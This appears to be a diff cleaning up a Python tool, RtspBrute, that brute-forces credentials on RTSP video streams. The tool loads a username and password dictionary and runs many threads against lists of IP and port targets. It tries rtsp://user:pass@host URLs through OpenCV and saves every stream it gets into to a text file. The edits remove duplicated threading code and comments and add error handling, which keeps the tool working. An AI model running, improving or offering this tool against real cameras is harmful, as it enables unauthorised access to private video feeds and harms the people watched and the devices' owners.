@@ -7,7 +7,6 @@ import queue
 import time
 from common import cargar_datos, guardar_datos
 
-
 class RtspBrute:
     def __init__(self, targets, dictionary_file, pause_duration=1, max_threads=50):
         self.targets = targets
@@ -16,33 +15,16 @@ class RtspBrute:
         self.max_threads = max_threads if max_threads is not None else len(self.targets)
         self.q = queue.Queue()
 
-
     def load_dictionary(self, dictionary_file):
         with open(dictionary_file, 'r') as f:
             return [line.strip() for line in f.readlines()]
 
     def run(self):
-        total_targets = len(self.targets)  # Obtener el número total de objetivos
+        total_targets = len(self.targets)
         print(f"Total targets: {total_targets}")
 
         for target in self.targets:
-##            print(f"Adding target: {target}")
             self.q.put(target)
-
-        print(f"Using {self.max_threads} threads")
-        threads = []
-        while not self.q.empty():
-            while len(threads) < self.max_threads and not self.q.empty():
-                t = threading.Thread(target=self.brute_force)
-                t.setDaemon(True)
-                t.start()
-                threads.append(t)
-
-            for t in threads:
-                t.join()
-            threads.clear()
-
-        print("Finished all threads")
 
         print(f"Using {self.max_threads} threads")
         threads = []
@@ -63,17 +45,15 @@ class RtspBrute:
         try:
             ip, port = target
             url = f"rtsp://{username}:{password}@{ip}:{port}/"
-            # Verificar si la URL ya está en el archivo antes de intentar guardarla
             if self.is_url_already_saved(url):
                 return
             os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "timeout;100"
             cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
-            # Establecer la tasa de FPS deseada
             cap.set(cv2.CAP_PROP_FPS, desired_fps)
             if cap.isOpened():
                 print(f"Target: {url}")
                 with open("RTSPCONECT.txt", "a") as file:
-                    file.write(f"{url}\n")  # Guardar la dirección RTSP
+                    file.write(f"{url}\n")
                 while True:
                     ret, frame = cap.read()
                     if not ret:
@@ -82,16 +62,17 @@ class RtspBrute:
                         break
                 cap.release()
                 cv2.destroyAllWindows()
-        except cv2.error as e:
+        except cv2.error:
             pass
-            #print(f"Error en la conexión RTSP: {e}")
 
-            
     def is_url_already_saved(self, url):
-        with open("RTSPCONECT.txt", "r") as file:
-            for line in file:
-                if url.strip() == line.strip():
-                    return True
+        try:
+            with open("RTSPCONECT.txt", "r") as file:
+                for line in file:
+                    if url.strip() == line.strip():
+                        return True
+        except FileNotFoundError:
+            pass
         return False
 
     def brute_force(self):
@@ -103,7 +84,7 @@ class RtspBrute:
             except Exception as e:
                 print(f"Error loading data: {e}")
                 continue
-            
+
             for dato in datos_filtrados:
                 if dato["IP"] == ip and dato["Puerto"] == port:
                     if dato["Banner"] and dato["Banner"] != "\u001b[31munknown\u001b[0m":
